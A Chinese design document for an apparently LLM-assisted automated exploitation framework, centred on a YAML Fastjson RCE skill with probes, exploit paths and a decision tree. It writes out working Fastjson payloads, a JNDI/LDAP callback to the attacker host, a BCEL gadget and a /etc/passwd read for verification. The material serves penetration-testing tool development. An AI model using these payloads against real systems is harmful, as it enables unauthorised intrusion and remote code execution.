# PentestAI Exploit Skill 系统设计方案

## 一、核心理念：原理驱动 vs 背答案

### 1.1 现有知识库的问题

以 fastjson 为例，当前 `fastjson_1224.json` 和 `fastjson_1247.json` 本质上是 Vulhub 靶场的"标准答案"：

```
端口写死 8090 → 现实中 fastjson 可能跑在任何端口
路径写死 /   → 现实中 JSON 接口可能在 /api/xxx 任何路径
工具写死 marshalsec → 现实中根据 JDK 版本需要不同利用链
地址写死 evil.com  → _replace_target 不处理这个占位符
两个版本的利用步骤几乎一模一样 → 没有体现版本差异
```

这导致 ReAct 循环的 LLM 拿到这份"知识"后，要么照搬（换个环境就挂），要么无视知识自由发挥（大概率走偏）。

### 1.2 原理驱动的含义

一个"原理驱动"的 Skill 应该回答这些问题：

1. **漏洞的本质是什么？** —— fastjson 的 autoType 在反序列化时会实例化任意 Java 类
2. **有哪几条利用路径？每条的前置条件是什么？** —— JNDI(需回连+低版本JDK)、BCEL(不需回连+JDK≤8u251)、TemplatesImpl(需特定配置)
3. **怎么根据探测结果选路径？** —— 先探测确认 fastjson 存在 → 探测版本范围 → 检查环境约束 → 选最优路径
4. **每条路径的具体步骤？** —— 不是"发这条curl"，而是"构造包含X gadget chain的payload，发送到{探测到的JSON端点}"
5. **怎么判断成功/失败？失败后怎么切换路径？**

### 1.3 设计原则

```
Skill ≠ "针对某道CTF题的解题步骤"
Skill = "针对某类漏洞的完整利用方法论，可适配不同环境"
```

具体原则：

- **不硬编码端口/路径**：所有目标信息从上游（VulnAgent的扫描结果）传入
- **多路径决策树**：每个 Skill 包含多条利用路径，按前置条件自动选择
- **环境感知**：NAT/公网、JDK版本、框架版本等影响路径选择
- **探测优先**：利用前先做精准探测，确认漏洞细节，再选利用路径
- **优雅降级**：首选路径失败后，自动尝试次优路径，而非让 LLM 自由发挥
- **LLM 兜底**：所有确定性路径都失败后，才进入 LLM 自由推理模式


## 二、Skill 数据结构

### 2.1 文件组织

```
backend/skills/
├── __init__.py
├── loader.py                # Skill 加载器
├── engine.py                # Skill 执行引擎（替代当前 ReAct 的"自由发挥"模式）
├── models.py                # Skill 数据模型
├── registry.py              # Skill 注册表（匹配 + 检索）
│
├── java_deserial/           # 按漏洞类别分目录（不是按CVE编号）
│   ├── fastjson.yaml        # Fastjson 全版本利用 Skill
│   ├── shiro.yaml           # Shiro 反序列化 Skill
│   ├── weblogic.yaml        # WebLogic 反序列化 Skill
│   └── jboss.yaml           # JBoss 反序列化 Skill
│
├── web_rce/
│   ├── struts2.yaml         # Struts2 OGNL 注入 Skill
│   ├── thinkphp.yaml        # ThinkPHP RCE Skill
│   ├── flask_ssti.yaml      # Flask/Jinja2 SSTI Skill
│   ├── django_debug.yaml    # Django Debug RCE Skill
│   └── php_fpm.yaml         # PHP-FPM RCE Skill
│
├── server_misconfig/
│   ├── tomcat.yaml          # Tomcat（弱口令 + PUT上传 + Manager部署）
│   ├── activemq.yaml        # ActiveMQ 反序列化
│   └── geoserver.yaml       # GeoServer OGC Filter RCE
│
└── credential/
    └── brute_force.yaml     # 通用弱口令利用
```

**注意**：不再按 CVE 编号拆分文件。`fastjson.yaml` 包含 1.2.24、1.2.47、1.2.68、1.2.80 等全版本的利用逻辑，因为它们的底层原理相同（autoType 反序列化），只是绕过方式不同。这就是"原理驱动"——同一个原理下的不同版本变体，在同一个 Skill 里用条件分支处理。

### 2.2 Skill YAML 完整 Schema

```yaml
# ─────────────────────────────────────────────
# Skill 元信息
# ─────────────────────────────────────────────
skill_id: "fastjson_rce"            # 全局唯一标识
name: "Fastjson autoType 反序列化 RCE"
category: "java_deserialization"
version: "1.0"

# 漏洞原理（给 LLM 阅读的背景知识，用于无法匹配确定性路径时的自由推理）
principle: |
  Fastjson 是阿里巴巴的 Java JSON 库。其 autoType 特性允许 JSON 中通过
  @type 字段指定反序列化的 Java 类。攻击者可以指定危险类（如 JdbcRowSetImpl、
  TemplatesImpl、BasicDataSource 等），触发 JNDI 查找、类加载或命令执行。
  
  不同版本的防御机制：
  - ≤1.2.24：无 autoType 限制，可直接使用任意类
  - 1.2.25~1.2.41：引入黑名单，但可通过 L/; 前缀绕过
  - 1.2.42~1.2.47：修复 L; 绕过，但可通过 java.lang.Class 缓存绕过
  - 1.2.48~1.2.67：修复缓存绕过，需要新 gadget chain
  - 1.2.68~1.2.80：引入 safeMode，但 expectClass 可绕过
  - ≥1.2.83：默认关闭 autoType，基本安全
  
  利用路径取决于三个因素：
  1. Fastjson 版本（决定需要什么绕过方式）
  2. 目标 JDK 版本（JDK 8u191+ 限制了 JNDI 远程类加载）
  3. 网络拓扑（JNDI 需要目标能回连攻击机；BCEL/TemplatesImpl 不需要）

# ─────────────────────────────────────────────
# 匹配规则（Skill Registry 用来决定是否适用）
# ─────────────────────────────────────────────
match:
  # 满足 ANY 一组即匹配
  rules:
    - fingerprint_contains: ["fastjson"]        # VulnAgent 指纹识别结果
    - fingerprint_contains: ["com.alibaba.fastjson"]
    - cve_matches: ["CVE-2017-18349", "CVE-2022-25845"]
    - evidence_contains: ["fastjson", "@type"]  # 扫描证据中的关键词
    - json_probe_result: "FASTJSON_DETECTED"    # VulnAgent 的 JSON 主动探测结果

  # 排除条件（匹配到也不执行）
  exclude:
    - fingerprint_contains: ["fastjson 2."]     # Fastjson 2.x 架构完全不同

# ─────────────────────────────────────────────
# 探测阶段（Probe）
# 利用前的精准信息收集，结果用于决策树
# ─────────────────────────────────────────────
probes:
  # 探测 1：确认 fastjson 存在并粗测版本范围
  - id: "confirm_fastjson"
    description: "发送 @type 探测 payload，确认 fastjson 并通过报错信息推断版本"
    command: |
      curl -s -X POST {ENDPOINT}
        -H "Content-Type: application/json"
        -d '{{"@type":"java.lang.AutoCloseable"'
        --max-time 10
    # 注意：{ENDPOINT} 是运行时变量，由 VulnAgent 传入的目标URL
    # 不是写死的 http://xxx:8090/
    parse_rules:
      # 根据响应内容设置变量，供决策树使用
      - if_contains: "autoType is not support"
        set: { fastjson_version_range: ">=1.2.68", autotype_enabled: false }
      - if_contains: "type not match"
        set: { fastjson_version_range: "1.2.25~1.2.67", autotype_enabled: true }
      - if_contains: "com.alibaba.fastjson"
        set: { fastjson_confirmed: true }
      - if_status_code: [400, 500]
        set: { json_endpoint_active: true }
      - if_status_code: [200]
        and_body_not_empty: true
        set: { json_endpoint_active: true, fastjson_confirmed: true }

  # 探测 2：精确版本探测（通过不同 payload 的差异响应）
  - id: "version_fingerprint"
    depends_on: { fastjson_confirmed: true }
    description: "通过多个版本特征 payload 精确判断版本范围"
    steps:
      # 1.2.47 缓存绕过测试
      - command: |
          curl -s -X POST {ENDPOINT}
            -H "Content-Type: application/json"
            -d '{{"a":{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}},"b":{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/test","autoCommit":true}}}}'
            --max-time 10
        parse_rules:
          - if_contains: "JdbcRowSetImpl"
            set: { version_bypass_47: true, fastjson_version_range: "<=1.2.47" }
          - if_contains: "autoType is not support"
            set: { version_bypass_47: false, fastjson_version_range: ">=1.2.48" }

      # 1.2.24 直接 autoType 测试
      - command: |
          curl -s -X POST {ENDPOINT}
            -H "Content-Type: application/json"
            -d '{{"@type":"java.net.Inet4Address","val":"127.0.0.1"}}'
            --max-time 10
        parse_rules:
          - if_not_contains: ["error", "deny", "not support"]
            set: { direct_autotype: true, fastjson_version_range: "<=1.2.24" }

  # 探测 3：检查目标 JDK 版本（影响 JNDI 利用可行性）
  - id: "jdk_version_probe"
    depends_on: { fastjson_confirmed: true }
    description: "通过 JNDI 连接行为推断目标 JDK 版本"
    # 只在攻击机有公网IP时执行（需要目标回连）
    requires: { env.can_reverse: true }
    command: |
      # 启动临时 LDAP listener，看目标是否会尝试加载远程类
      timeout 15 python3 -c "
      import socket, threading, time
      results = []
      def listen():
          s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          s.bind(('0.0.0.0', 13899)); s.settimeout(12); s.listen(1)
          try:
              c, a = s.accept(); data = c.recv(4096); results.append(data); c.close()
          except: pass
          finally: s.close()
      t = threading.Thread(target=listen, daemon=True); t.start()
      time.sleep(1)
      import subprocess
      subprocess.run([
          'curl', '-s', '-X', 'POST', '{ENDPOINT}',
          '-H', 'Content-Type: application/json',
          '-d', '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{LHOST}:13899/test\",\"autoCommit\":true}',
          '--max-time', '10'
      ], capture_output=True)
      t.join(timeout=12)
      if results:
          print('JNDI_CALLBACK_RECEIVED')
          # 如果收到 LDAP 请求，说明 JDK 未限制 JNDI 远程加载（<8u191）
          print('JDK_JNDI_UNRESTRICTED')
      else:
          print('JNDI_NO_CALLBACK')
      "
    parse_rules:
      - if_contains: "JDK_JNDI_UNRESTRICTED"
        set: { jdk_allows_jndi_remote: true }
      - if_contains: "JNDI_CALLBACK_RECEIVED"
        set: { target_can_reach_us: true }
      - if_contains: "JNDI_NO_CALLBACK"
        set: { jdk_allows_jndi_remote: false }

# ─────────────────────────────────────────────
# 利用路径（Exploit Paths）
# 按优先级排列，引擎自动选择第一个满足条件的路径
# ─────────────────────────────────────────────
exploit_paths:

  # ═══════════════════════════════════════════
  # 路径 A：BCEL ClassLoader（无回连，最通用）
  # ═══════════════════════════════════════════
  - path_id: "bcel_classloader"
    name: "BCEL ClassLoader 命令执行"
    priority: 1    # 最高优先级（不需要回连，适用范围最广）

    # 原理说明（给 LLM 参考，理解为什么这条路径 work）
    principle: |
      利用 com.sun.org.apache.bcel.internal.util.ClassLoader 在目标 JVM 本地
      加载 BCEL 编码的恶意字节码。不需要目标回连攻击机，不受 JDK 版本的
      JNDI trustURLCodebase 限制。但需要目标 classpath 中有 BCEL 库
      （JDK 8 自带，JDK 9+ 已移除）。

    # 前置条件（全部满足才选择此路径）
    conditions:
      fastjson_confirmed: true
      # BCEL 在 JDK 8 中可用，JDK 9+ 移除了
      # 但大多数使用 fastjson 的 Java 应用跑在 JDK 8 上
      # 所以优先尝试，失败再切换

    # 不适用条件（满足任一则跳过此路径）  
    skip_if:
      fastjson_version_range: ">=1.2.68"
      # 1.2.68+ 的 safeMode 会阻止 BCEL 加载

    steps:
      - id: "bcel_rce_id"
        description: "用 BCEL 编码执行 id 命令，验证 RCE"
        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} id"
        timeout: 30
        success_criteria:
          stdout_contains_any: ["uid=", "root", "www-data", "tomcat"]
        on_success: "bcel_rce_whoami"
        on_fail: "next_path"    # BCEL 不可用，尝试下一条路径

      - id: "bcel_rce_whoami"
        description: "确认当前用户身份"
        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} whoami"
        timeout: 30
        success_criteria:
          stdout_not_empty: true
        on_success: "conclude_success"
        evidence_capture:
          current_user: "stdout"
          shell_type: "rce_bcel"

  # ═══════════════════════════════════════════
  # 路径 B：JNDI 注入（需要回连，但可靠性高）
  # ═══════════════════════════════════════════
  - path_id: "jndi_injection"
    name: "JNDI 注入远程类加载"
    priority: 2

    principle: |
      通过 JdbcRowSetImpl 的 dataSourceName 属性触发 JNDI 查找。攻击机
      启动恶意 LDAP/RMI 服务（JNDIExploit），目标连接后加载远程恶意类执行命令。
      
      限制条件：
      - 需要目标能回连攻击机（NAT 环境不可用）
      - JDK 8u191+ 默认限制 JNDI 远程类加载（trustURLCodebase=false）
        但 JNDIExploit 工具内置了多种绕过方式（本地 Reference、
        Tomcat BeanFactory 等），仍有成功可能

    conditions:
      fastjson_confirmed: true
      env.can_reverse: true       # 攻击机有公网IP
      target_can_reach_us: true   # 探测阶段确认目标能回连

    steps:
      - id: "jndi_exploit"
        description: "使用 JNDIExploit 一键利用"
        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
        on_success: "jndi_verify"
        on_fail: "jndi_tomcat_bypass"

      - id: "jndi_tomcat_bypass"
        description: "尝试 Tomcat BeanFactory 绕过（JDK 高版本场景）"
        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id --gadget tomcat"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
        on_success: "jndi_verify"
        on_fail: "next_path"

      - id: "jndi_verify"
        description: "执行 whoami 确认 RCE"
        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} whoami"
        timeout: 120
        success_criteria:
          stdout_not_empty: true
        on_success: "conclude_success"
        evidence_capture:
          current_user: "stdout"
          shell_type: "rce_jndi"

  # ═══════════════════════════════════════════
  # 路径 C：1.2.47 缓存绕过 + BCEL
  # ═══════════════════════════════════════════
  - path_id: "cache_bypass_bcel"
    name: "1.2.47 java.lang.Class 缓存绕过 + BCEL"
    priority: 3

    principle: |
      Fastjson 1.2.25~1.2.47 虽然引入了 autoType 黑名单，但可以通过
      先用 java.lang.Class 将目标类加入缓存，再在第二个字段中引用缓存
      来绕过检查。结合 BCEL ClassLoader 可实现无回连 RCE。

    conditions:
      fastjson_confirmed: true
      version_bypass_47: true     # 探测阶段确认 1.2.47 绕过可用

    steps:
      - id: "cache_bypass_rce"
        description: "构造 java.lang.Class 缓存绕过 payload + BCEL"
        command: |
          python3 /opt/bcel_fastjson.py {ENDPOINT} id --bypass cache
        timeout: 30
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: "conclude_success"
        on_fail: "next_path"

  # ═══════════════════════════════════════════
  # 路径 D：手工 curl payload（最后的确定性尝试）
  # ═══════════════════════════════════════════
  - path_id: "manual_payloads"
    name: "手工 Payload 逐一尝试"
    priority: 4

    principle: |
      当工具化路径都失败时，直接发送经典 payload 尝试。
      包括不同 gadget chain 和不同绕过方式。

    conditions:
      fastjson_confirmed: true

    steps:
      # TemplatesImpl（需要 Feature.SupportNonPublicField 开启，概率较低）
      - id: "templates_impl"
        description: "TemplatesImpl gadget（不需回连，需特定配置）"
        command: |
          python3 -c "
          import subprocess, base64, json
          # 生成 TemplatesImpl payload
          cmd = 'id'
          # 构造恶意字节码（省略实际生成逻辑，用预置脚本）
          result = subprocess.run(
              ['python3', '/opt/templates_fastjson.py', '{ENDPOINT}', cmd],
              capture_output=True, text=True, timeout=20
          )
          print(result.stdout)
          print(result.stderr)
          "
        timeout: 30
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: "conclude_success"
        on_fail: "next_step"

      # BasicDataSource（DBCP/Tomcat-DBCP，不需回连）
      - id: "dbcp_datasource"
        description: "BasicDataSource gadget（DBCP 依赖）"
        command: |
          curl -s -X POST {ENDPOINT}
            -H "Content-Type: application/json"
            -d '{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"$$BCEL$$$l$8b...BCEL_ENCODED_CLASS..."}'
            --max-time 15
        timeout: 20
        success_criteria:
          stdout_contains_any: ["uid="]
        on_success: "conclude_success"
        on_fail: "next_path"

  # ═══════════════════════════════════════════
  # 路径 E：LLM 自由推理（所有确定性路径失败后的兜底）
  # ═══════════════════════════════════════════
  - path_id: "llm_freeform"
    name: "LLM 自由推理利用"
    priority: 99   # 最低优先级

    principle: |
      所有预定义利用路径均未成功。将之前所有探测结果和失败信息
      提供给 LLM，让其根据具体情况自由推理利用方案。

    conditions:
      fastjson_confirmed: true

    mode: "react_freeform"
    # 进入现有的 ReAct 多轮循环，但 LLM 已经拥有了：
    # 1. 漏洞原理（principle 字段）
    # 2. 精确的版本/环境信息（探测阶段结果）
    # 3. 之前尝试过哪些路径、为什么失败（所有步骤的执行记录）
    # 这比现在"拿一段 JSON 知识就开始自由发挥"要好得多
    max_rounds: 5   # 限制自由推理轮次（比默认的 8 轮少）

# ─────────────────────────────────────────────
# 验证方法（RCE 确认后的标准验证流程）
# ─────────────────────────────────────────────
verification:
  rce_confirm:
    - command: "{EXPLOIT_CMD} 'cat /etc/passwd'"
      expect_contains: "root:"
    - command: "{EXPLOIT_CMD} 'id'"
      expect_contains: "uid="

# ─────────────────────────────────────────────
# 修复建议（写入报告）
# ─────────────────────────────────────────────
remediation: |
  1. 升级 Fastjson 至 2.x 或使用 fastjson2
  2. 如无法升级，启用 safeMode：ParserConfig.getGlobalInstance().setSafeMode(true)
  3. 使用白名单限制可反序列化的类
  4. 配置 WAF 规则拦截包含 @type 的 JSON 请求
```


## 三、Skill 执行引擎架构

### 3.1 引擎与现有 ReAct 的关系

```
当前架构：
  ExploitAgent → MSF快速通道 → ReAct自由推理（LLM即兴发挥 8 轮）

改进后架构：
  ExploitAgent → MSF快速通道 → Skill引擎（确定性路径优先）→ ReAct兜底
                                     │
                                     ├── 匹配 Skill
                                     ├── 执行探测阶段
                                     ├── 根据探测结果选择利用路径
                                     ├── 按步骤执行（失败自动切换路径）
                                     └── 全部失败 → 带完整上下文进入 ReAct
```

关键改变：**LLM 从"一开始就自由发挥"变成"确定性路径用完后才自由发挥，且自由发挥时拥有完整的上下文信息"。**

### 3.2 Skill Engine 核心流程

```python
class SkillEngine:
    """
    Skill 执行引擎。

    职责：
    1. 根据漏洞信息匹配 Skill
    2. 执行探测阶段，收集环境信息
    3. 按优先级遍历利用路径，选择满足条件的第一条
    4. 按步骤执行利用，处理成功/失败/切换
    5. 所有路径失败后，整理完整上下文交给 ReAct 兜底
    """

    async def execute(self, skill, finding, target_url, env_profile):
        context = SkillContext(
            endpoint=target_url,
            lhost=env_profile.lhost,
            can_reverse=env_profile.can_reverse,
        )

        # Phase 1: 探测
        for probe in skill.probes:
            if probe.depends_on and not context.check(probe.depends_on):
                continue
            if probe.requires and not context.check(probe.requires):
                continue
            result = await self._run_probe(probe, context)
            context.update(result)

        # Phase 2: 选路径 + 执行
        for path in sorted(skill.exploit_paths, key=lambda p: p.priority):
            if path.mode == "react_freeform":
                # 最低优先级：LLM 兜底
                return await self._react_freeform(skill, context, all_records)

            if not context.check(path.conditions):
                continue
            if path.skip_if and context.check(path.skip_if):
                continue

            result = await self._execute_path(path, context)
            if result.success:
                return result
            # 该路径失败，记录原因，继续下一条

        # 所有路径失败
        return ExploitResult(success=False, evidence="所有 Skill 路径均未成功")
```

### 3.3 变量替换机制

Skill 中的变量不再是简单的 `{TARGET}` 字符串替换，而是运行时上下文变量：

```
{ENDPOINT}    → VulnAgent 传入的实际 URL（如 http://10.0.0.5:8080/api/user）
{LHOST}       → 攻击机 IP（从环境变量读取）
{TARGET_IP}   → 目标 IP（从 ENDPOINT 解析）
{TARGET_PORT} → 目标端口（从 ENDPOINT 解析）
{EXPLOIT_CMD} → 当前成功的利用命令模板（用于验证阶段复用）
```

**关键区别**：`{ENDPOINT}` 是 VulnAgent 探测到的实际 JSON 接口地址，而不是写死的 `http://target:8090/`。VulnAgent 在指纹识别阶段已经发现了哪个端口、哪个路径接受 JSON 请求，这个信息直接传给 Skill。


## 四、以 Fastjson 为例的完整利用决策树

```
                    VulnAgent 发现 fastjson 指纹
                              │
                    ┌─────────▼──────────┐
                    │  Probe: confirm    │
                    │  发送 @type 探测   │
                    └─────────┬──────────┘
                              │
                    ┌─────────▼──────────┐
                    │ Probe: version     │
                    │ 精确版本指纹       │
                    └─────────┬──────────┘
                        ┌─────┴─────┐
                   ≤1.2.24    1.2.25~47    ≥1.2.48
                     │           │            │
              ┌──────▼─┐   ┌────▼───┐   ┌────▼────┐
              │ 路径A  │   │ 路径C  │   │ 路径A   │
              │ BCEL   │   │ Cache  │   │ BCEL    │
              │ 直接打 │   │ Bypass │   │ (可能被 │
              │        │   │ +BCEL  │   │ safeMode│
              └───┬────┘   └───┬────┘   │ 阻止)  │
                  │            │        └────┬────┘
             成功? │       成功? │        成功? │
             ├─是→ 完成   ├─是→ 完成    ├─是→ 完成
             └─否─┐      └─否─┐       └─否─┐
                  │            │             │
          ┌───────▼────────────▼─────────────▼───────┐
          │     攻击机有公网 IP？                      │
          │     是 → 路径 B: JNDI 注入                │
          │     否 → 路径 D: 手工 Payload 尝试         │
          └──────────────────┬───────────────────────┘
                             │
                        成功? │
                        ├─是→ 完成
                        └─否─┐
                             │
                    ┌────────▼────────┐
                    │  路径 E: LLM    │
                    │  自由推理       │
                    │  （带完整上下文）│
                    └─────────────────┘
```

**这棵决策树体现了"原理驱动"：**
- 不是"对 1.2.24 用这个 payload，对 1.2.47 用那个 payload"
- 而是"先探测版本 → 根据版本选择绕过方式 → 根据环境选择 gadget chain"


## 五、与现有代码的集成方案

### 5.1 改动范围

```
需要新增的文件：
  backend/skills/models.py      # Skill 数据模型（Pydantic）
  backend/skills/loader.py      # YAML 加载 + 校验
  backend/skills/engine.py      # Skill 执行引擎
  backend/skills/registry.py    # Skill 匹配检索
  backend/skills/java_deserial/fastjson.yaml  # （示例 Skill）
  backend/skills/...            # 其他 Skill YAML

需要修改的文件：
  backend/agents/exploit_agent.py  # ExploitAgent._exploit_one() 增加 Skill 路径
  backend/agents/models.py         # ExploitResult 增加 skill_id 字段
  backend/knowledge/retriever.py   # 适配 Skill，减少对旧 KB 的依赖

可以逐步废弃的文件：
  backend/knowledge/kb_data/*.json    # 旧知识库 JSON（Skill 成熟后移除）
  backend/knowledge/exploit_kb.py     # 旧知识库引擎（Skill 成熟后移除）
  backend/knowledge/builder.py        # 旧知识库构建脚本
```

### 5.2 ExploitAgent 的修改

```python
# 修改后的利用优先级：
async def _exploit_one(self, target, finding, target_os, context):
    # 第一优先级：MSF 快速通道（不变）
    msf_module = _lookup_msf(finding)
    if msf_module:
        result = await self._exploit_via_msf(...)
        if result.success:
            return result

    # 🆕 第二优先级：Skill 引擎（确定性路径）
    skill = self.skill_registry.match(finding)
    if skill:
        result = await self.skill_engine.execute(
            skill=skill,
            finding=finding,
            target_url=finding.target,  # VulnAgent 探测到的实际 URL
            env_profile=self.env,
        )
        if result.success:
            return result
        # Skill 失败：引擎内部已经尝试了所有路径包括 LLM 兜底
        return result

    # 第三优先级：无匹配 Skill，纯 ReAct 自由推理（现有逻辑不变）
    return await self._exploit_react(target, finding, target_os, context)
```

### 5.3 迁移策略

**不需要一次性重写所有知识库。** 可以逐步迁移：

1. **第一批**：先写 fastjson、shiro、struts2、thinkphp 这 4 个高频漏洞的 Skill（覆盖大部分 CTF 靶场）
2. **共存阶段**：Skill 引擎优先匹配，没匹配到的漏洞 fallback 到旧 KB + ReAct
3. **逐步替换**：每新增一个 Skill，对应的旧 JSON 就可以废弃
4. **最终**：所有旧 KB JSON 被 Skill 替代，移除旧知识库引擎


## 六、与 CyberStrikeAI 的差异

| 维度 | CyberStrikeAI | 我们的设计 |
|------|---------------|-----------|
| 语言 | Go | Python |
| Skill 格式 | 纯文本 Markdown（给 LLM 阅读） | 结构化 YAML（机器可执行 + LLM 可读） |
| 执行方式 | LLM 阅读 Skill 后自由生成命令 | 引擎按决策树执行，LLM 只在兜底时介入 |
| 决策逻辑 | 在 LLM 脑子里 | 在 YAML 的 conditions/parse_rules 里 |
| 探测阶段 | 没有独立的探测阶段 | 有结构化的 probes，结果驱动路径选择 |
| 适配性 | 依赖 LLM 理解和适配 | 变量替换 + 条件分支，确定性适配 |
| MCP 集成 | 作为工具调用协议 | 我们不引入 MCP，工具调用走现有 ToolExecutor |

**核心差异是执行模式：** CyberStrikeAI 的 Skill 本质是"给 LLM 看的参考文档"，LLM 看完后还是自由发挥生成命令。我们的 Skill 是"机器可执行的决策树"，确定性路径由引擎直接执行，只有兜底阶段才让 LLM 介入。

这意味着对于已知漏洞，利用成功率不再依赖 LLM 的"即兴发挥能力"，而是依赖 Skill 的覆盖度和质量。LLM 的能力被用在更合适的地方：处理未知漏洞和异常情况。


## 七、评估标准

一个好的 Skill 应该满足：

1. **端口/路径无关**：用 {ENDPOINT} 变量，不硬编码
2. **版本覆盖**：同一个 Skill 处理漏洞的多个版本变体
3. **环境自适应**：NAT/公网自动切换利用路径
4. **探测先行**：利用前做精准探测，不盲目发 payload
5. **多路径冗余**：至少 2~3 条利用路径，自动降级
6. **LLM 兜底**：确定性路径穷尽后，有带上下文的 LLM 自由推理
7. **证据完整**：每一步的输入/输出都记录，供报告使用
